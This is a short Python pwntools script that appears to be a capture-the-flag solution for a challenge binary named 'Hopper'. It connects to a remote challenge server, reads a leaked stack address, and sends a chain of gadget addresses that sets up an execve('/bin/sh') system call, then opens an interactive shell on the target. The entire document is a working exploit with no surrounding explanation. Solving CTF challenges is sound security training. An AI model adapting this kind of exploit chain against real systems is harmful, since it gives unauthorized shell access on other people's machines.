#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("../handout/Hopper")
context.binary = exe

#io = gdb.debug(exe.path, 'b* _start+0x46\nc')
#io = remote('127.0.0.1', 5000)
io = remote('pwn.1nf1n1ty.team', 31886)
io.recvuntil(b'Y.  )\n')
stack = unpack(io.recv(8), 'all')

io.sendafter(b'>> ', p64(0x401017)+p64(stack+24)+p64(stack+0x18)+p64(59)+p64(0x40100c)+p64(0x401011)+b'/bin/sh\x00'+p64(0x401028)+p64(0x401021)+p64(0x401077))
io.interactive()
